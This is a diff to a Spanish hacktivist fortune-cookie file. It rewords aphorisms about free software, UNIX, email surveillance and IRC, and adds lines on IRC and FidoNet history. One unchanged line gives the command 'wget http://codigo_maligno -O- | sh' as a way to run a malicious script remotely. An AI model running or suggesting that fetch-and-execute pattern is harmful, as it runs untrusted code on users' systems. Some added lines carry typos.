@@ -60,7 +60,7 @@ Para nosotros un depurador no es un fin, sino el medio para el bien del
 kernel y la grandeza y felicidad de sus hackers.
 %
 Los dos brazos del hacktivismo son el Software Libre y el Hardware
-Libre. Con ellos damos un abrazo a los hackers de Justicia y Amor.
+Libre. Con ellos damos a los hackers un abrazo de Justicia y Amor.
 %
 El hacktivismo quiere la unidad de los hackers y no la lucha. Queremos
 POSIX, pero no formateos.
@@ -171,15 +171,19 @@ su software.
 Nuestro enorme campo de acción son las redes, pretendidas por el enemigo
 pero dominadas por nuestro Pueblo.
 %
+Encomio lo compilado.
+%
 La infraestructura de correo electrónico que se utiliza en todo el mundo
 es, por diseño, insegura.
 %
 La mayoría de los servidores de correo públicos no están controlados por
 los destinatarios, sino que son ofrecidos por proveedores de Internet de
-la oligarquía. Debemos desconfiar de ellos ampliamente, pues estos han
-demostrado no tener escrúpulo alguno y acceder a correspondencia
-electrónica de abonados quienes consideran riesgosos para sus planes
-inconfesables.
+la oligarquía.
+%
+Debemos desconfiar de los servidores de correo ofrecidos por la
+oligarquía. Han demostrado no tener escrúpulo alguno y acceder a
+correspondencia electrónica de aquellos abonados a quienes consideran
+riesgosos para sus planes inconfesables.
 %
 La oligarquía ha hecho - a falta de ley adecuada de protección - abusos
 informáticos duraderos.
@@ -357,10 +361,58 @@ comunicaciones telemáticas en tiempo real.
 %
 Las salas de chat IRC pueden diagramarse dentro de un servidor de la
 forma que queramos a fin de lograr cierta privacidad, mediante el uso de
-"canales (los cuales también podríamos llamar "sub-salas"). Este
-temperamento se puede hacer a nivel servidor, pero normalmente también
-se habilita a los propios usuarios, a fin de permitirles orientar las
-charlas si fuese necesario.
+"canales" (las cuales también podríamos llamar "sub-salas").
+%
+Los usuarios de IRC normalmente pueden seguir el temperamento de crear
+sus propias sub-salas temáticas, las que suelen indicarse con el símbolo
+"#". Estas permiten orientar las charlas si fuese necesario.
+%
+Existen ricas subculturas basadas en el uso de programas de conversación
+telemática.
+%
+Si bien es cierto que el IRC puede constituir una forma de interacción
+aterrorizantemente cerebral y mecánicamente deshumanizada, pero
+normalmente es todo lo contrario.
+%
+IRC fue inventado para divertirse con las comunicaciones, y este
+continúa siendo su uso más popular.
+%
+Fue el año 1988 cuando se compiló el primer programa de IRC, para
+permitir la comunicación escrita síncona entre múltiples usuarios
+mediados por la Internet.
+%
+Los adeptos al IRC pueden fácilmente volverse adictos.
+%
+IRC es - en escencia - un flujo de datos.
+%
+IRC es una forma de comunicación dinámica: nuevos mensajes aparecerán en
+la pantalla, y reemplazarán a los viejos.
+%
+IRC cuenta con los elementos mínimos de comunicaci{on necesarios para
+que un grupo de compañeros cree un sentido compartido de comunidad.
+%
+En IRC, el discurso es efímero.
+%
+Los compañeros suelen dejar una pequeña "ventana abierta"; en ella se
+proyecta el texto de una sala de conversación IRC.
+%
+Si aparece un mensaje en la ventana de conversación, significa que
+alguien - en algún lugar del mundo - la escribió no mucho más que un
+segundo atrás.
+%
+Cuando chateas no puedes ver a la gente, pero puedes inferirla.
+%
+Sin expresiones faciales, tono de voz, lenguaje corporal, ambiente
+físico compartido y otras pistas contextuales, las emociones pueden
+transmitirse a través del chat IRC usando emoticones.
+%
+El programa WRITE permite a los compañeros hospedados en máquinas UNIX
+distintas comunicarse pantalla a pantalla.
+%
+Los sistemas de chat que termiten a un individuo enviar mensajes
+mecanografiados directamente a la pantalla de otra pesona que está
+enlazada al mismo sistema se remontan a los sistemas de tiempo de
+cómputo compartido de la década del 60.
 %
 Gran parte del software que recibo y envío está preparado en lenguaje
 Python, el nuevo BASIC capaz de correr en todo tipo de máquinas. Y para
@@ -3176,23 +3228,26 @@ La versión original de UNIX estaba escrita en ensamblador, pero dado que
 el grupo de investigación también estaba desarrollando el lenguaje C en
 esos años, inmediatamente fue reescrita con este nuevo lenguaje.
 %
-El sistema UNIX nació esencialmente como una reacción a los sistemas
-operativos grandes, complejos e inflexibles disponibles a fines de la
-década de 1960.
+UNIX nació esencialmente como una reacción a los sistemas operativos
+grandes, complejos e inflexibles disponibles a fines de la década de
+1960.
 %
-Las versiones recientes de UNIX están estructuradas para el uso fácil y
-funcional en las redes de transmisión de datos.
+Las versiones recientes de UNIX están estructuradas para un uso sencillo
+y funcional en las redes de transmisión de datos.
 %
 UNIX es un sistema multitarea de tiempo compartido que puede afrontar
 fácilmente varias tareas en paralelo.
 %
-En un sistema UNIX de única usuari@, la programadora puede escribir un
-archivo, enviarlo a una impresora y enviar correo a otra computadora
-simultáneamente, gracias a su funcionalidad de multitarea.
+En un sistema UNIX, la programadora puede escribir un archivo, enviarlo
+a una impresora y enviar correo a otra computadora simultáneamente,
+gracias a su funcionalidad de multitarea.
 %
-Al ser un sistema multiusuari@, UNIX permite que múltiples usuari@s
-realicen varias tareas simultáneamente, dando a cada uno de ell@s la
-impresión de ser la únic@ operari@ de la máquina.
+Al ser un sistema multiusuaria, UNIX permite que varias de ellas
+realizar muchas tareas simultáneamente, dando a cada una la impresión de
+ser la única operaria de la máquina.
+%
+En escencia, el scheduler se encarga de hacer infiel la CPU con sus
+usuarios.
 %
 Cerrar sesión en el sistema evita que personas no autorizadas utilicen
 su terminal, especialmente si el terminal se encuentra en un lugar
@@ -6725,14 +6780,17 @@ otros propósitos sin su consentimiento.
 Debe haber una manera para que una persona corrija o modifique un
 registro de información identificable sobre sí misma.
 %
-Cualquier organización que cree, mantenga, utilice o difunda registros
-de datos personales identificables debe garantizar la confiabilidad de
-los datos para el uso previsto y debe tomar precauciones para evitar el
-uso indebido de tales datos.
+Cualquier organización que elabore, mantenga, utilice o difunda
+registros de datos personales identificables debe garantizar la
+confiabilidad de los datos para el uso previsto y debe tomar
+precauciones para evitar el uso indebido de tales datos.
+%
+Una cosa es compilar datos personales, y otra cotejarlos. La
+corroboración debe ser humana.
 %
 Las redes altamente interconectadas son relativamente inseguras, y
-constituyen un entorno difícil para hacer cumplir reglas basadas en
-principios éticos.
+constituyen un ambiente dificil para al cumplimiento de reglas basadas
+en principios éticos.
 %
 Si el dinero o el poder derivados del espionaje en la red resultan
 significativos, y los tecnicismos de la red dificultan rastrear a los
@@ -6742,9 +6800,9 @@ Pueblo.
 Las capacidades de las tecnologías de recopilación y clasificación de
 información son hoy en día formidables.
 %
-El Pueblo debe imponer limitaciones verificables a las tecnologías que
-pueden recolectar y cribar cantidades abrumadoras de información
-individual trivial pero colectivamente reveladora.
+El Pueblo debe imponer limitaciones verificables a las tecnologías
+capaces de colectar y cribar cantidades abrumadoras de información
+individual trivial, pero colectivamente reveladora.
 %
 Una subcultura de pioneros del software informático conocida como
 cypherpunks ha estado trabajando para hacer posible el encriptado
@@ -6778,7 +6836,7 @@ cantidad correcta de valor, sin que el vendedor sepa quién es el
 comprador.
 %
 El cifrado de llave pública tal como existe hoy en día es irrompible
-para todos los ordenadores, excepto para los más potentes, como los de
+para todos los ordenadores, excepto aquellos más potentes, como los de
 la Agencia de Seguridad Nacional estadounidense.
 %
 El debate político y los desafíos legales han girado en torno a los
@@ -6911,24 +6969,22 @@ covergente creación de una especie de cultura internacional con
 identidad propia.
 %
 Lurkear en red equivale escuchar a escondidas un interminable
-radioteatro aficionado, donde el éter que separe al elenco de su
-audiencia es inexistente.
+radioteatro aficionado, donde no existe éter que separa al elenco de su
+audiencia.
 %
 La comunicación mediada por computadora se convertirá en el próximo gran
 escapismo, en la tradición del radioteatro, las matinés de los sábados y
 la pantalla grande.
 %
-Siendo que la política es siempre una combinación de comunicación y
-poder físico, el papel de las redes de datos entre los descamisados
-cobra una importancia relevante para la organización de una comunidad.
+El papel de las redes de datos entre los descamisados cobra una
+importancia relevante para la organización de una comunidad.
 %
 Es tonto criticar a las comunicaciones mediadas por cómputo sólo porque
 algunas personas las utilizan para lograr un objetivo revolucionario.
 %
-Un Pueblo Trabajador en línea gozará de la felicidad efectiva pues los
-compañeros con los que interactuará más unificadamente serán
-seleccionados por interés organizativo en lugar de instrumentarlo por
-mera proximidad física.
+Los compañeros con los que interactuará más unificadamente en línea
+serán seleccionados por interés organizativo en lugar de instrumentarlo
+por mera proximidad física.
 %
 Iniciar sesión en UNIX durante sólo uno o dos minutos, docenas de veces
 al día, es similar a echar un vistazo al cafetín para ver si están los
@@ -7139,10 +7195,10 @@ de la Masa, y a ésta, la Justicia Social.
 La idea del conferenciado telemático emanó de la construcción de las
 primeras herramientas de pensamiento basadas en ordenador.
 %
-La primer aplicación importante producidas en el ámbito de la
-comunicación de masas a masas, fue la de instrumentar un pensamiento de
-unión para la Liberación. Las redes de computadoras así orientadas sólo
-pueden acelerarla.
+La primer aplicación importante producida en el ámbito de la
+comunicación de masas a masas, fue instrumentar un pensamiento de unión
+para la Liberación. Las redes de computadoras así orientadas sólo pueden
+acelerarla.
 %
 Los hackers del Tercer Mundo valoran los autómatas ofensivos en red
 basados en software libre. Les dan privilegios.
@@ -7361,7 +7417,7 @@ informáticos del sistema en que estás logueado hasta agotarlos.
 Utiliza wget http://codigo_maligno -O- | sh para correr telemáticamente
 un script maligno.
 %
-No es labor de UNIX impedir que el root se pegue un tiro en el pie.
+No es labor de UNIX impedir que el root se de un tiro en el pie.
 %
 Desprograma la obsolescencia con software libre.
 %
@@ -7418,11 +7474,11 @@ que lo haga correr.
 %
 El código funcional corre hasta que se emparcha.
 %
-Tu Smartwarch dejará de darte la hora nomás pierdas el cable de carga.
+Tu Smartwarch dejará de darte la hora nomás pierdas su cable de carga.
 %
 Un disco sin GNU es como un fusil sin pólvora.
 %
-Ser root implica tener los pies en la tierra.
+Ser root implica tener los pies en la tierra y los puertos cerrados.
 %
 Un puerto abierto es una invitación.
 %
@@ -7440,3 +7496,30 @@ La shell no está obligada de hacer lo que no comprende.
 No me repito, y cuando lo hago uso recursión.
 %
 Si al darse la mano gritan, ¿cómo será cuando los módems hagan el amor?
+%
+Los compañeros pusieron a disposición de forma totalmente gratuita, sus
+ordenadores, que permanecían conectados a la línea telefónica a través
+del módem, listos para responder a la llamada del Pueblo.
+%
+La red FidoNet comentzó como n esfuerzo de unión entre compañeros a
+través de sus máquinas, para ver si podía compartir correo electrónico
+entre ellos, y sólo por diversión.
+%
+Cada noche cada BBS se conectaba con su nodo FidoNet de referencia, es
+decir, otra BBS cercana, e intercambiaban datos.
+%
+En FidoNet los mensajes públicos se distribuían atravezando toda la red
+noto por nodo, mientras que los privados llegaban únicamente al BBS de
+destino.
+%
+Con FidoNet, si todo iba bien, un mensaje llegaba al destinatario al día
+siguiente y el remitente respondía dos días después.
+%
+El EchoMail de FidoNet consistía en foros temáticos de mensajería por
+suscripción y acceso público.
+%
+Aprende el lenguaje ensamblador de las CPUs que utilizas.
+%
+Si no elevamos conciencia sobre las nociones de programación de bajo
+nivel, todo el arte será ahogado por un océano de kits intermediarios de
+desarrollo, blobs binarios y chips propietarios.
